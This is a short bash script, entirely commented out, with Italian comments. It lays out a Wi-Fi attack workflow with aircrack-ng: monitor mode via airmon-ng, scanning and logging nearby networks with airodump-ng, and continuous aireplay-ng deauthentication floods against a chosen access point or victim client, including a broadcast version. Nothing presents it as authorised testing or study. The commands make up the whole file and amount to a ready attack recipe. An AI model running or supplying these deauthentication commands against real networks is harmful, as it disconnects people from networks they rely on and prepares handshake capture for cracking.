#!/bin/bash
# sudo iwlist wlan0 scan | grep "Address\|Channel:\|ESSID:"
#airmon-ng start wlan0
#airmon-ng start wlan0mon
#airodump-ng wlan0mon

#airodump-ng wlan0mon -w reportAiro -a


#airodump-ng -d <mac-SSID-Target> -c <channel> wlan0mon
#aireplay-ng -0 0(times) -a <mac-SSID-Target> -c <mac-victim-Target> wlan0mon
#aireplay-ng -0 0(times) -a <mac-SSID-Target> wlan0mon (broadcast version)

#accendi
#airmon-ng start wlan0
#airmon-ng start wlan0mon

#scnnerizza e salva in file
#airodump-ng wlan0mon
#attendi 10 secondi e poi killa

#seleziona un mac e deautha
#aireplay-ng -0 0(times) -a <mac-SSID-Target> wlan0mon (broadcast version)

#service networking restart && airmon-ng start wlan0 && airmon-ng stop wlan0mon &&  ifconfig wlan0 up